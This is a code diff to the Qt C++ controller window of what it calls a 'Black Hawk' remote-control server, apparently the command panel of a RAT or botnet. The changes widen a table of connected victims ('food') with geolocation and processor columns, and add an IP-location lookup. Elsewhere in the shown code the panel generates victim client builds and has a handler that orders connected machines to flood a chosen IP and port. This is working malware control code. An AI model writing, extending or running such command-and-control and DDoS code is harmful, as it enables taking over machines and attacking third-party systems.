@@ -10,14 +10,14 @@ Hunter::Hunter(QWidget *parent)
     // -------------------------------------------界面设计------------------------------------------------
     // 主窗口
     this->setWindowTitle("Black Hawk 远控软件服务端 by lfish");
-    this->setFixedSize(730, 500);
+    this->setFixedSize(750, 500);
 
     // 总设置区
     ui->widgetOption->setFixedHeight(200);
 
     // 图片区
     ui->labelSister->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
-    ui->labelSister->setContentsMargins(0, 6, 0, 6);
+//    ui->labelSister->setContentsMargins(0, 6, 0, 6);
     ui->labelSister->setText("");
     QMovie *movie = new QMovie(":/Icons/lze");
     movie->start();
@@ -69,6 +69,7 @@ Hunter::Hunter(QWidget *parent)
     ui->lineEditPort2->setToolTip("hunter服务器监听端口");
     ui->lineEditPort2->setValidator(new QIntValidator(1,65535));
     ui->lineEditPort2->setAlignment(Qt::AlignCenter);
+    ui->lineEditPort2->setText("18000");
     // 启动hunter服务器开关
     ui->btSwitch->setText("启动hunter");
     ui->btSwitch->setToolTip("开始或停止监听端口");
@@ -77,15 +78,23 @@ Hunter::Hunter(QWidget *parent)
     ui->btGenerate->setToolTip("根据连接端口和域名生成食物端");
 
     // 上线表格区
-    ui->tableOnline->setColumnCount(5);
+    ui->tableOnline->setColumnCount(7);
     ui->tableOnline->setHorizontalHeaderItem(0, new QTableWidgetItem("ID"));
     ui->tableOnline->setHorizontalHeaderItem(1, new QTableWidgetItem("用户名"));
     ui->tableOnline->setHorizontalHeaderItem(2, new QTableWidgetItem("IP地址"));
     ui->tableOnline->setHorizontalHeaderItem(3, new QTableWidgetItem("端口号"));
-    ui->tableOnline->setHorizontalHeaderItem(4, new QTableWidgetItem("系统版本"));
+    ui->tableOnline->setHorizontalHeaderItem(4, new QTableWidgetItem("归属地"));
+    ui->tableOnline->setHorizontalHeaderItem(5, new QTableWidgetItem("系统版本"));
+    ui->tableOnline->setHorizontalHeaderItem(6, new QTableWidgetItem("处理器"));
     // 自适应列宽
-    ui->tableOnline->horizontalHeader()->setStretchLastSection(true);
-    ui->tableOnline->horizontalHeader()->setSectionResizeMode(0, QHeaderView::ResizeToContents);
+    ui->tableOnline->setColumnWidth(0, 30);
+    ui->tableOnline->setColumnWidth(1, 60);
+    ui->tableOnline->setColumnWidth(2, 120);
+    ui->tableOnline->setColumnWidth(3, 60);
+    ui->tableOnline->setColumnWidth(4, 70);
+    ui->tableOnline->setColumnWidth(5, 150);
+    ui->tableOnline->horizontalHeader()->setSectionResizeMode(6, QHeaderView::Stretch);
+
     // 隐藏水平表头
     ui->tableOnline->verticalHeader()->setHidden(true);
     // 一行一行地选中
@@ -104,7 +113,7 @@ Hunter::Hunter(QWidget *parent)
     connect(ui->btSwitch, &QPushButton::clicked, this, [=](){
         if (mCook->GetTcpServer()->server()->isListening()) {
             mCook->stop();
-            ui->btSwitch->setText("启动hunter服务器");
+            ui->btSwitch->setText("启动hunter");
             ui->lineEditPort2->setReadOnly(false);
         } else {
             // 根据输入端口开启hunter服务器
@@ -115,7 +124,7 @@ Hunter::Hunter(QWidget *parent)
             mCook->start(ui->lineEditPort2->text().toInt());
             if (mCook->GetTcpServer()->server()->isListening()) {
                 QMessageBox::information(this,"提示","恭喜主人！hunter服务器成功开启~");
-                ui->btSwitch->setText("停止hunter服务器");
+                ui->btSwitch->setText("停止hunter");
                 ui->lineEditPort2->setReadOnly(true);
             } else {
                 QMessageBox::warning(this, "提示", "对不起主人...开启服务端失败");
@@ -264,8 +273,8 @@ Hunter::Hunter(QWidget *parent)
                 food->sendCmdDdos(port);
                 //发送攻击目标IP和端口
                 dk->sendCommand(IP,PORT);
-                //断开客户？？？？
-                food->closeAndDelete();
+                //断开食物？？？？
+//                food->closeAndDelete();
             }
         }
         else
@@ -280,8 +289,8 @@ Hunter::Hunter(QWidget *parent)
 
     // 初始化hunter服务器
     mCook = new Cook(this);
-    connect(mCook, SIGNAL(foodLogin(int,QString,QString,int,QString)),
-            this, SLOT(addFoodToTbl(int,QString,QString,int,QString)));
+    connect(mCook, SIGNAL(foodLogin(int,QString,QString,int,QString,QString)),
+            this, SLOT(addFoodToTbl(int,QString,QString,int,QString,QString)));
     connect(mCook, SIGNAL(foodLogout(int)), this, SLOT(rmFoodFromTbl(int)));
 //    mCook->start(18000)
 
@@ -298,7 +307,7 @@ Hunter::~Hunter()
 // ------------------------------------几个功能按键逻辑----------------------------------------
 
 // 添加食物列表
-void Hunter::addFoodToTbl(int id, QString username, QString ipaddr, int port, QString sysInfo){
+void Hunter::addFoodToTbl(int id, QString username, QString ipaddr, int port, QString sysInfo, QString proInfo){
 
     // 增加一行
     int count = ui->tableOnline->rowCount();
@@ -309,16 +318,28 @@ void Hunter::addFoodToTbl(int id, QString username, QString ipaddr, int port, QS
     ui->tableOnline->setItem(count, 0 , itemId);
 
     QTableWidgetItem *itemUsername = new QTableWidgetItem(username);
+    itemUsername->setTextAlignment(Qt::AlignCenter);
     ui->tableOnline->setItem(count, 1 , itemUsername );
 
     QTableWidgetItem *itemIpaddr = new QTableWidgetItem(ipaddr);
+    itemIpaddr->setTextAlignment(Qt::AlignCenter);
     ui->tableOnline->setItem(count, 2 , itemIpaddr);
 
     QTableWidgetItem *itemPort = new QTableWidgetItem(QString::number(port));
+    itemPort->setTextAlignment(Qt::AlignCenter);
     ui->tableOnline->setItem(count, 3 , itemPort);
 
+    QString locate =ipLocation(ipaddr);
+    QTableWidgetItem *itemLocate = new QTableWidgetItem(locate);
+    itemLocate->setTextAlignment(Qt::AlignCenter);
+    ui->tableOnline->setItem(count, 4 , itemLocate);
+
     QTableWidgetItem *itemSysInfo = new QTableWidgetItem(sysInfo);
-    ui->tableOnline->setItem(count, 4 , itemSysInfo);
+    ui->tableOnline->setItem(count, 5 , itemSysInfo);
+
+    QTableWidgetItem *itemProInfo = new QTableWidgetItem(proInfo);
+    ui->tableOnline->setItem(count, 6 , itemProInfo);
+
 }
 
 // 删除食物
@@ -344,7 +365,38 @@ int Hunter::curFoodIdInTbl(){
     return ui->tableOnline->item(index, 0)->text().toInt();
 }
 
-// 开启服务器监听
-void Hunter::startLstn(){
-
+QString Hunter::ipLocation(QString ip)
+{
+    /*-----------------------------------------
+    局域网IP地址范围
+    A类：10.0.0.0-10.255.255.255
+    B类：172.16.0.0-172.31.255.255
+    C类：192.168.0.0-192.168.255.255
+    -------------------------------------------*/
+    QString Location="内网";
+    //判断是否为内网地址
+    QStringList list=ip.split(".");
+    if(list[0]=="10" || (list[0]=="172" && list[1].toInt()>15 && list[1].toInt()<32)\
+            || (list[0]=="192" && list[1]=="168") || ip=="127.0.0.1"  )
+    {
+       return Location;
+    }
+    //使用126接口进行ip查询
+    QString Starturl="http://ip.ws.126.net/ipquery?ip=";
+    Starturl.append(ip);
+    QUrl url(Starturl);
+    QNetworkRequest request(url);
+    QNetworkAccessManager *manger=new QNetworkAccessManager();
+    QNetworkReply *reply=manger->get(request);
+    QEventLoop loop;
+    connect(reply,SIGNAL(finished()),&loop,SLOT(quit()));
+    loop.exec();
+    //编码转换
+//    QTextCodec *text=QTextCodec::codecForName("GBK");
+//    QString html=text->toUnicode(reply->readLine());
+    QString html = reply->readLine();
+    QRegExp city("lc=\"(.*)\"");
+    city.indexIn(html);
+    Location=city.cap(1);
+    return Location;
 }
